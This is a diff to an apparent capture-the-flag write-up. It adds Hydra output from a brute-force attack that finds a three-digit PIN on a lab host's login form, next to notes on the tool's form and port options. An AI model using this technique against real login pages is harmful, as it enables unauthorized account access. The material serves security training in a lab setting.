@@ -108,6 +108,18 @@ crunch: 100% completed generating output
      - `http-post-form "/login.php:pin=^PASS^:Access denied"`: Defines the login form parameters.
      - `-s 8000`: Specifies the port.
 
+```
+[VERBOSE] Disabled child 9 because of too many errors
+[VERBOSE] Disabled child 12 because of too many errors
+[VERBOSE] Page redirected to http[s]://10.10.18.217:8000/error.php
+[VERBOSE] Page redirected to http[s]://10.10.18.217:8000/error.php
+[8000][http-post-form] host: 10.10.18.217   password: 670
+[STATUS] attack finished for 10.10.18.217 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-04 16:55:34
+
+```
+
 3. **Unlocking the Device:**
    - After obtaining the password, log in using the discovered PIN code.
    - Unlock the device to retrieve the flag.
